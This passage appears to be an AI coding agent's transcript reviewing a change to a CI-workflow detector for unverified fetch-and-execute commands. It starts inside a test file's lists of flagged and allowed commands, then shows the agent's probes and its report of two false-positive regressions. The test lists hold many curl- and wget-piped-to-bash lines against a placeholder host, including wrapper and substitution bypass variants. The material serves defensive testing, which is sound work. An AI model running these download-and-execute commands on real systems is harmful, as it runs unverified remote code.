     "curl -o/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
     "curl -o=/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
     "wget -P /tmp https://x/i.sh && bash /tmp/i.sh",
     "wget --directory-prefix=/tmp https://x/i.sh && bash /tmp/i.sh",
     "curl --output-dir /tmp -O https://x/i.sh && bash /tmp/i.sh",
     "curl --output-dir=/tmp -O https://x/i.sh && bash /tmp/i.sh",
     # --- cycle-13 R2: honest fail-opens the first structural walk still missed ---
     "curl -fsSLo f https://x/i.sh\nbash < f",  # downloaded file executed via a `<` stdin redirect
     "curl -fsSLo install.sh https://x/i.sh\nbash ./install.sh",  # `./name` must match downloaded `name`
     "curl -fsSL https://x/i.sh | cat > >(bash)",  # pure sink writes into >(interpreter)
     "$(curl -fsSL https://x/cmd)",  # fetch substitution in command position is executed
     # --- cycle-13 R4: wrappers whose options take ARGUMENTS must not hide the interpreter/fetch ---
     'sudo -u root bash -c "$(curl -fsSL https://x/i.sh)"',
     'env -u BASH_ENV bash -c "$(curl -fsSL https://x/i.sh)"',
     'timeout -k 5s 30s bash -c "$(curl -fsSL https://x/i.sh)"',
     "env -u X curl -fsSL https://x/i.sh | bash",
     # --- cycle-14 R3: a GLUED code operand (`-c"$(curl)"`, no space) is still executed ---
     'bash -c"$(curl -fsSL https://x/i.sh)"',
     'python3 -c"$(curl -fsSL https://x/i.py)"',
     'perl -e"$(curl -fsSL https://x/i.pl)"',
+    # --- cycle-15: a shell's static `-c` STRING operand is itself shell (recursively scanned) ---
+    "bash -c 'curl -fsSL https://x/i.sh | bash'",
+    "sh -c 'set -e; curl -fsSL https://x/i.sh | bash'",
+    "sudo bash -c 'curl -fsSL https://x/i.sh | bash'",
 ]
 
 ALLOWED = [
     "curl -fsSL https://x/v.json | jq .version",
     "curl -fsSL https://x/r.txt | grep tag_name",
     "curl -fsSL https://x/r.txt | grep x | head -1",
     "curl -fsSL https://x/f",  # bare fetch to stdout, goes nowhere
     # download -> verify -> use (a real verify command vets the download)
     "curl -fsSL https://x/i.sh -o f && sha256sum -c sums.txt && bash f",
     "curl -fsSL https://x/i.sh -o f\nsha256sum -c sums.txt\nbash f",
     # the actionlint install shape (checksum piped from echo)
     'curl -sSL https://x/a.tgz -o t.tgz\necho "$SHA  t.tgz" | sha256sum -c -\ntar -xz -f t.tgz\nactionlint',
     # cosign-verified download
     "curl -fsSL https://x/app -o app\ncosign verify-blob --signature s app\n./app",
     # --- cycle-13 R2: data-capture is NOT execution (interpreter-aware rule (B)); these MUST pass or
     # the gate is too noisy to use — fetching a value into a variable/output is the dominant pattern ---
     "VERSION=$(curl -s https://api/releases/latest | jq -r .tag_name)",
     "X=$(curl -fsSL https://x/v.txt)",
     'export V="$(curl -fsSL https://x/v.txt)"',
     'echo "v=$(curl -s https://x/v)" >> "$GITHUB_OUTPUT"',
     "curl -fsSL https://x/v.json | env jq .version",  # wrapped pure sink resolves through `env`
     'echo "$(curl -fsSL https://x/v.json)" | jq .version',  # substitution into a non-interpreter = data
     'grep curl README.md | sed "s/curl/CURL/"',  # a literal `curl` ARGUMENT is not a fetch command
     "diff <(curl -fsSL https://x/a) <(curl -fsSL https://x/b)",  # two fetches compared as data
     # --- cycle-13 R4: precise interpreter/introspection/path rules must not over-flag ---
     "command -v curl | tee curl-path.txt",  # `command -v` looks curl UP, it is not a fetch
     'python3 tools/report.py "$(curl -fsSL https://x/data.json)"',  # fetch is a DATA arg to a script, not -c
     "curl -fsSLo /tmp/data.json https://x/data.json\njq . ./fixtures/data.json",  # same basename, different dirs
     # --- cycle-14 R1: a verify-manifest pipeline NAMES the artifact; it is not a use-before-verify.
     # Verify is BLOCK-LEVEL (an order-aware attempt was reverted — it FP'd these), so a checksum that
     # names/sets-up the artifact in any order still vets the block. ---
     'curl -fsSLo tool https://x/tool\nprintf "%s  %s\\n" "$SHA256" tool | sha256sum -c -\nchmod +x tool\n./tool',
     "curl -fsSLo tool https://x/tool\nchmod +x tool\nsha256sum -c sums.txt\n./tool",  # setup-before-verify
     # DOCUMENTED residual (block-level verify): a verify AFTER the use still vets — accepted fail-open
     # (contrived honest mistake) in exchange for zero FPs on the common verified-install shapes above.
     "curl -fsSLo install.sh https://x/i.sh\nbash install.sh\nsha256sum -c sums.txt",
+    # --- cycle-15: a literal interpreter token in an ordinary command's args is not an interpreter, and
+    # a non-shell -c operand (python/perl code) is that language, not shell — neither over-flags ---
+    'grep bash -e "$(curl -fsSL https://x/p)" file',  # grep is the program; `bash` is a search term
+    "bash -c 'curl -fsSL https://x/v | jq .'",  # static -c string is a DATA pipe
+    "python3 -c 'import os; os.system(\"echo hi\")'",  # python -c is python code, never re-parsed as shell
 ]
 
 
 def test_flags_every_historical_bypass():
     for line in FLAGGED:
         assert fev(line), f"fail-open miss: {line!r}"
 
 
 def test_allows_data_pipes_and_verified_installs():
     for line in ALLOWED:
         assert fev(line) == [], f"false positive: {line!r}"
 
 
 def test_only_run_blocks_scanned_not_metadata():
     wf = (
         "jobs:\n  a:\n    steps:\n"
         '      - name: "see curl https://x | bash docs"\n'
         "        env:\n          NOTE: curl https://x | bash\n"
         "      - run: curl https://x/i.sh | bash\n"
     )
     out = fev(wf)
     assert len(out) == 1, out
 
 
 def test_run_block_scalar_variants_extracted():
     assert fev("      - run: |\n          set -e\n          curl https://x/i.sh | bash\n")
     assert fev("      - run: |2\n          curl https://x/i.sh | bash\n")
     assert fev("      - run : curl https://x/i.sh | bash\n")
 
 
 def test_quoted_and_flow_run_keys_extracted():
     # cycle-13 Group D: a real YAML parse normalises quoted keys and flow-style steps, so a `curl|bash`
     # behind `"run":` or `{run: …}` can no longer evade the line regex that the first walk relied on.
     q = chr(34)
     assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - " + q + "run" + q + ": curl https://x | bash\n")
     assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - 'run': curl https://x | bash\n")
     assert fev(
         "jobs:\n  x:\n    steps:\n      - run: echo ok\n      - { name: pwn, run: "
         + q
         + "curl https://x | bash"
         + q
         + " }\n"
     )
 
 
 def test_unparseable_block_with_fetch_fails_closed():
     # a templated/garbled block that mentions curl but bashlex can't parse -> fail closed
     assert fev("      - run: curl https://x/i.sh | {{ bad templating |\n")

exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
from aviato.plugins.actionpins import fetch_execute_violations as fev
cases = {
\"bare_grep_bash_c_static_filename\": \"grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
\"sudo_grep_bash_c_static_filename\": \"sudo grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
\"env_grep_bash_c_static_filename\": \"env grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
\"timeout_grep_bash_c_static_filename\": \"timeout 5s grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
\"nice_grep_bash_c_static_filename\": \"nice -n 5 grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
\"stdbuf_grep_bash_c_static_filename\": \"stdbuf -oL grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
\"nohup_grep_bash_c_static_filename\": \"nohup grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
}
for name, cmd in cases.items():
    print(name, \"=>\", fev(cmd))
'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
bare_grep_bash_c_static_filename => []
sudo_grep_bash_c_static_filename => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
env_grep_bash_c_static_filename => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
timeout_grep_bash_c_static_filename => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
nice_grep_bash_c_static_filename => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
stdbuf_grep_bash_c_static_filename => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
nohup_grep_bash_c_static_filename => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']

exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
import subprocess
code = subprocess.check_output([\"git\", \"show\", \"HEAD"'^:aviato/plugins/actionpins.py"], text=True, stderr=subprocess.DEVNULL)
ns = {}
exec(compile(code, "parent_actionpins.py", "exec"), ns)
parent_fev = ns["fetch_execute_violations"]
from aviato.plugins.actionpins import fetch_execute_violations as head_fev
cases = {
"bash_c_real_fetch_exec": "bash -c '"'\\''curl -fsSL https://x/i.sh | bash'\\''\",
\"bash_e_script_name_shell_text\": \"bash -e '\\''curl -fsSL https://x/i.sh | bash'\\''\",
\"sudo_grep_bash_c_static_filename\": \"sudo grep bash -c '\\''curl -fsSL https://x/i.sh | bash'\\'' file\",
\"sudo_grep_bash_e_subst\": \"sudo grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
\"bare_grep_bash_e_subst\": \"grep bash -e \\\""'$(curl -fsSL https://x/p)'"\\\" file\",
}
for name, cmd in cases.items():
    print(name)
    print(\"  parent=>\", parent_fev(cmd))
    print(\"  head  =>\", head_fev(cmd))
'" in /Users/amattas/GitHub/aviato
 succeeded in 1415ms:
bash_c_real_fetch_exec
  parent=> []
  head  => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
bash_e_script_name_shell_text
  parent=> []
  head  => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
sudo_grep_bash_c_static_filename
  parent=> []
  head  => ['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']
sudo_grep_bash_e_subst
  parent=> ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
  head  => ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
bare_grep_bash_e_subst
  parent=> ['fetch-and-execute without checksum: fetch substitution executed by an interpreter']
  head  => []

exec
/bin/zsh -lc "PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=. python3 -c '
import importlib.util
spec = importlib.util.spec_from_file_location(\"tfe\", \"tests/core/test_fetch_execute.py\")
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
for name in [\"test_flags_every_historical_bypass\", \"test_allows_data_pipes_and_verified_installs\", \"test_only_run_blocks_scanned_not_metadata\", \"test_run_block_scalar_variants_extracted\", \"test_quoted_and_flow_run_keys_extracted\", \"test_unparseable_block_with_fetch_fails_closed\"]:
    getattr(mod, name)()
    print(name, \"PASS\")
'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
test_flags_every_historical_bypass PASS
test_allows_data_pipes_and_verified_installs PASS
test_only_run_blocks_scanned_not_metadata PASS
test_run_block_scalar_variants_extracted PASS
test_quoted_and_flow_run_keys_extracted PASS
test_unparseable_block_with_fetch_fails_closed PASS

codex
Verdict: **not stable**. Confidence: **high**.

Findings:

1. **New regression from recursive scan:** shell `-e` is treated like a code-string flag.
   In [actionpins.py](/Users/amattas/GitHub/aviato/aviato/plugins/actionpins.py:98), `_CODE_FLAGS` includes `-e`, and [ `_static_code_operands` ](/Users/amattas/GitHub/aviato/aviato/plugins/actionpins.py:309) applies that to shells. But `bash -e ARG` treats `ARG` as a script filename, not inline shell code.
   Probe:
   `bash -e 'curl -fsSL https://x/i.sh | bash'`
   Parent: `[]`
   HEAD: `['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']`

2. **New wrapper + recursion FP:** wrapped benign `grep` can be misclassified as a shell because wrapper fallback scans any word for `bash`.
   [actionpins.py](/Users/amattas/GitHub/aviato/aviato/plugins/actionpins.py:298) makes `_is_shell()` true for `sudo grep bash ...`, then `grep`’s `-c` argument is recursively parsed as shell.
   Probe:
   `sudo grep bash -c 'curl -fsSL https://x/i.sh | bash' file`
   Parent: `[]`
   HEAD: `['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']`

Confirmed stable parts:

- No wrapper-hidden interpreter fail-open found for `sudo/env/timeout/nice/stdbuf/nohup ... bash -c "$(curl)"`; all flagged.
- Actual benign `bash -c` data cases stayed clean: `curl|jq`, capture, echo-to-jq, literal text, verified install.
- `python3 -c`, `ruby -e`, and `perl -e` static code were not re-parsed as shell; substitution code operands still flag as intended.
- Existing `tests/core/test_fetch_execute.py` functions pass when invoked directly with `PYTHONPATH=. python3 -c`.

So cb13d57 fixed the intended `bash -c 'curl|bash'` miss, but introduced at least two false positives around shell-option classification.
tokens used
77,487
Verdict: **not stable**. Confidence: **high**.

Findings:

1. **New regression from recursive scan:** shell `-e` is treated like a code-string flag.
   In [actionpins.py](/Users/amattas/GitHub/aviato/aviato/plugins/actionpins.py:98), `_CODE_FLAGS` includes `-e`, and [ `_static_code_operands` ](/Users/amattas/GitHub/aviato/aviato/plugins/actionpins.py:309) applies that to shells. But `bash -e ARG` treats `ARG` as a script filename, not inline shell code.
   Probe:
   `bash -e 'curl -fsSL https://x/i.sh | bash'`
   Parent: `[]`
   HEAD: `['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']`

2. **New wrapper + recursion FP:** wrapped benign `grep` can be misclassified as a shell because wrapper fallback scans any word for `bash`.
   [actionpins.py](/Users/amattas/GitHub/aviato/aviato/plugins/actionpins.py:298) makes `_is_shell()` true for `sudo grep bash ...`, then `grep`’s `-c` argument is recursively parsed as shell.
   Probe:
   `sudo grep bash -c 'curl -fsSL https://x/i.sh | bash' file`
   Parent: `[]`
   HEAD: `['fetch-and-execute without checksum: shell -c string: fetch piped into a non-data-sink command']`

Confirmed stable parts:

- No wrapper-hidden interpreter fail-open found for `sudo/env/timeout/nice/stdbuf/nohup ... bash -c "$(curl)"`; all flagged.
- Actual benign `bash -c` data cases stayed clean: `curl|jq`, capture, echo-to-jq, literal text, verified install.
- `python3 -c`, `ruby -e`, and `perl -e` static code were not re-parsed as shell; substitution code operands still flag as intended.
- Existing `tests/core/test_fetch_execute.py` functions pass when invoked directly with `PYTHONPATH=. python3 -c`.

So cb13d57 fixed the intended `bash -c 'curl|bash'` miss, but introduced at least two false positives around shell-option classification.
